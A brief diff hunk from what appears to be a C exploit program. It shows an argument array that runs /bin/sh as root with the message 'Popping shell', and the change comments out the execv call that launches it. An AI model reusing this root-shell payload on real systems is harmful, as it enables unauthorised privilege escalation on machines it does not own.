@@ -173,7 +173,7 @@ int main() {
                 "echo \\\"Done! Popping shell... (run commands now)\\\";"
                 "/bin/sh;"
             "\" root"};
-        execv("/bin/sh", argv);
+       /* execv("/bin/sh", argv);*/
 
         printf("system() function call seems to have failed :(\n");
 	return EXIT_SUCCESS;
